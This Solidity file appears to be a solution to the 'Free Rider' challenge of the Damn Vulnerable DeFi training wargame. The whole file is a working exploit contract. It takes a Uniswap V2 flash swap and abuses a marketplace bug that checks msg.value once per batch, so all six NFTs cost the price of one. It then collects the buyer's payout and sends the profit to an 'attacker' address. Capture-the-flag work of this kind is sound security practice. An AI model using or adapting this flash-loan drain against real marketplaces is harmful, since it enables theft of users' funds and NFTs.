// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {FreeRiderBuyer} from "./FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {IUniswapV2Factory, IUniswapV2Pair} from "./Interfaces.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {WETH9} from "../WETH9.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract FreeSwapper is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;

    FreeRiderBuyer internal immutable freeRiderBuyer;
    FreeRiderNFTMarketplace internal immutable freeRiderNFTMarketplace;
    DamnValuableNFT internal immutable damnValuableNFT;
    IUniswapV2Pair internal immutable uniswapV2Pair;
    IUniswapV2Factory internal immutable uniswapV2Factory;
    DamnValuableToken internal immutable dvt;
    WETH9 internal immutable weth;
    address internal immutable attacker;

    constructor(
        address _freeRiderBuyer,
        address payable _freeRiderNFTMarketplace,
        address _damnValuableNFT,
        address _uniswapV2Factory,
        address _dvt,
        address payable _weth
    ) {
        freeRiderBuyer = FreeRiderBuyer(_freeRiderBuyer);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(_freeRiderNFTMarketplace);
        damnValuableNFT = DamnValuableNFT(_damnValuableNFT);
        uniswapV2Factory = IUniswapV2Factory(_uniswapV2Factory);
        dvt = DamnValuableToken(_dvt);
        weth = WETH9(_weth);

        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));
        attacker = msg.sender;
    }

    function swap() public {
        require(msg.sender == attacker);

        uint256 amount = NFT_PRICE;
        uniswapV2Pair.swap(0, amount, address(this), abi.encode(unicode"✨"));
    }

    function uniswapV2Call(address, uint256, uint256 amount, bytes calldata) external {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        assert(msg.sender == uniswapV2Factory.getPair(token0, token1));

        weth.withdraw(weth.balanceOf(address(this)));

        _acquireNFTs();
        _sendNFTsToBuyer();

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapV2Pair), amountToRepay);

        payable(attacker).sendValue(address(this).balance);
    }

    function _acquireNFTs() internal {
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint8 i; i < AMOUNT_OF_NFTS;) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.buyMany{value: NFT_PRICE}(tokenIds);
    }

    function _sendNFTsToBuyer() internal {
        for (uint8 i; i < AMOUNT_OF_NFTS;) {
            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i);
            unchecked {
                ++i;
            }
        }
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory)
        external
        view
        override
        returns (bytes4)
    {
        require(msg.sender == address(damnValuableNFT));
        require(_tokenId >= 0 && _tokenId < AMOUNT_OF_NFTS);
        require(damnValuableNFT.ownerOf(_tokenId) == address(this));

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
